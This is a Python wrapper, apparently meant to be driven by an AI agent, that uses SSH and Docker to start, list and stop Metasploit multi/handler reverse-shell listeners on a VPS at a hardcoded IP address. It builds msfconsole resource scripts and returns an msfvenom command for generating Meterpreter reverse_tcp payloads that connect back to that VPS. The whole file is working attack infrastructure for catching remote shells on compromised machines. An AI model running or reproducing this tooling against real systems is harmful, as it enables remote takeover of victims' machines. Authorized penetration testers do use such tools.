#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Metasploit multi/handler - Reverse Shell Listener Wrapper
=========================================================

VPS Code API Pattern: SSH + docker exec + background handlers

Token Optimization:
- Start handler in background (tmux session)
- Return handler ID and connection details
- Check handler status without full output
- 95% token reduction via status summaries

Author: Intelligence Adjacent Framework
Date: 2025-11-16
"""

import sys
import io
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Dict, Optional

# Force UTF-8 encoding for Windows console output
if sys.platform == 'win32':
    # Only wrap if not already wrapped
    if not isinstance(sys.stdout, io.TextIOWrapper):
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    if not isinstance(sys.stderr, io.TextIOWrapper):
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# VPS Configuration
VPS_HOST = "15.204.218.153"
VPS_PORT = "2222"
VPS_USER = "debian"
SSH_KEY = Path.home() / ".ssh" / "gro_256"
CONTAINER_NAME = "metasploit"
OUTPUT_DIR = Path.home() / ".claude" / "cache" / "metasploit"

# Ensure output directory exists
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def _ssh_exec(command: str) -> Dict:
    """
    Execute command on VPS via SSH.

    Args:
        command: Shell command to run on VPS

    Returns:
        Dict with status and output
    """
    ssh_cmd = [
        "ssh",
        "-i", str(SSH_KEY),
        "-p", VPS_PORT,
        f"{VPS_USER}@{VPS_HOST}",
        command
    ]

    try:
        result = subprocess.run(
            ssh_cmd,
            capture_output=True,
            text=True,
            timeout=60
        )

        return {
            "status": "success" if result.returncode == 0 else "error",
            "returnCode": result.returncode,
            "stdout": result.stdout,
            "stderr": result.stderr
        }

    except subprocess.TimeoutExpired:
        return {
            "status": "timeout",
            "error": "Command execution timed out after 60 seconds"
        }
    except Exception as e:
        return {
            "status": "error",
            "error": str(e)
        }


def start_handler(
    lhost: str = "0.0.0.0",
    lport: int = 4444,
    payload: str = "linux/x64/meterpreter/reverse_tcp",
    session_name: Optional[str] = None,
    vps_ip: str = "15.204.218.153"
) -> Dict:
    """
    Start a Metasploit multi/handler in background.

    Args:
        lhost: Listening host (default: 0.0.0.0 for all interfaces)
        lport: Listening port (4444-4454)
        payload: Metasploit payload type
        session_name: Optional tmux session name (default: handler_PORT)
        vps_ip: VPS public IP for payload generation instructions

    Returns:
        Handler session info and connection command

    Example:
        >>> from servers.metasploit import handler
        >>> handler.start_handler(lport=4444)
    """
    if session_name is None:
        session_name = f"handler_{lport}"

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = OUTPUT_DIR / f"handler_{lport}_{timestamp}.log"

    # Build msfconsole resource script
    resource_script = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""

    # Create resource script inside Docker container
    script_path = f"/tmp/handler_{lport}_{timestamp}.rc"
    create_script = (
        f"docker exec {CONTAINER_NAME} sh -c "
        f"\"echo '{resource_script}' > {script_path}\""
    )

    result = _ssh_exec(create_script)
    if result["status"] != "success":
        return {
            "status": "error",
            "error": "Failed to create resource script",
            "details": result
        }

    # Start handler in tmux session
    start_cmd = (
        f"tmux new-session -d -s {session_name} "
        f"'docker exec -i {CONTAINER_NAME} msfconsole -r {script_path}'"
    )

    result = _ssh_exec(start_cmd)

    if result["status"] == "success":
        # Save handler info locally
        handler_info = {
            "sessionName": session_name,
            "lhost": lhost,
            "lport": lport,
            "payload": payload,
            "vpsIP": vps_ip,
            "startTime": timestamp,
            "logFile": str(log_file),
            "resourceScript": script_path
        }

        log_file.write_text(str(handler_info))

        return {
            "status": "success",
            "message": f"[+] Handler started on port {lport}",
            "handler": handler_info,
            "payloadCommand": f"msfvenom -p {payload} LHOST={vps_ip} LPORT={lport} -f [FORMAT]",
            "checkStatus": f"tmux attach -t {session_name}  # Attach to handler session",
            "stopCommand": f"tmux kill-session -t {session_name}  # Stop handler"
        }
    else:
        return {
            "status": "error",
            "message": f"[-] Failed to start handler on port {lport}",
            "details": result
        }


def list_handlers() -> Dict:
    """
    List all active handler sessions.

    Returns:
        List of active tmux sessions (handlers)

    Example:
        >>> from servers.metasploit import handler
        >>> handler.list_handlers()
    """
    result = _ssh_exec("tmux list-sessions 2>/dev/null | grep handler_ || echo 'No handlers running'")

    if result["status"] == "success":
        sessions = []
        for line in result["stdout"].splitlines():
            if "handler_" in line:
                # Parse: handler_4444: 1 windows (created Sat Nov 16 18:10:00 2025)
                parts = line.split(":")
                if len(parts) >= 2:
                    session_name = parts[0].strip()
                    port = session_name.split("_")[1] if "_" in session_name else "unknown"
                    sessions.append({
                        "sessionName": session_name,
                        "port": port,
                        "info": parts[1].strip()
                    })

        return {
            "status": "success",
            "handlerCount": len(sessions),
            "handlers": sessions
        }
    else:
        return {
            "status": "error",
            "error": "Failed to list handlers",
            "details": result
        }


def stop_handler(session_name: str) -> Dict:
    """
    Stop a running handler session.

    Args:
        session_name: Tmux session name (e.g., "handler_4444")

    Returns:
        Stop status

    Example:
        >>> from servers.metasploit import handler
        >>> handler.stop_handler("handler_4444")
    """
    result = _ssh_exec(f"tmux kill-session -t {session_name}")

    if result["status"] == "success":
        return {
            "status": "success",
            "message": f"[+] Handler {session_name} stopped"
        }
    else:
        return {
            "status": "error",
            "message": f"[-] Failed to stop handler {session_name}",
            "details": result
        }


def attach_handler(session_name: str) -> str:
    """
    Get command to attach to handler session (for manual inspection).

    Args:
        session_name: Tmux session name

    Returns:
        SSH + tmux attach command

    Example:
        >>> from servers.metasploit import handler
        >>> cmd = handler.attach_handler("handler_4444")
        >>> print(cmd)
    """
    return (
        f"ssh -i {SSH_KEY} -p {VPS_PORT} {VPS_USER}@{VPS_HOST} "
        f"-t 'tmux attach -t {session_name}'"
    )


# CLI Testing
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Metasploit Handler Management")
    parser.add_argument("--start", action="store_true", help="Start handler")
    parser.add_argument("--list", action="store_true", help="List active handlers")
    parser.add_argument("--stop", type=str, help="Stop handler (session name)")
    parser.add_argument("--lhost", type=str, default="15.204.218.153", help="Listening host")
    parser.add_argument("--lport", type=int, default=4444, help="Listening port")
    parser.add_argument("--payload", type=str, default="linux/x64/meterpreter/reverse_tcp", help="Payload type")

    args = parser.parse_args()

    if args.start:
        print("[*] Starting Metasploit handler...")
        result = start_handler(args.lhost, args.lport, args.payload)
        print(f"Status: {result['status']}")
        print(f"Message: {result.get('message', 'No message')}")
        if result["status"] == "success":
            print(f"\n[*] Handler Info:")
            print(f"  Port: {result['handler']['lport']}")
            print(f"  Payload: {result['handler']['payload']}")
            print(f"\n[*] Commands:")
            print(f"  Attach: {result['checkStatus']}")
            print(f"  Stop: {result['stopCommand']}")

    elif args.list:
        print("[*] Listing active handlers...")
        result = list_handlers()
        print(f"Status: {result['status']}")
        print(f"Active Handlers: {result.get('handlerCount', 0)}")
        for h in result.get('handlers', []):
            print(f"  - {h['sessionName']} (Port {h['port']})")

    elif args.stop:
        print(f"[*] Stopping handler {args.stop}...")
        result = stop_handler(args.stop)
        print(f"Status: {result['status']}")
        print(f"Message: {result.get('message', 'No message')}")

    else:
        parser.print_help()
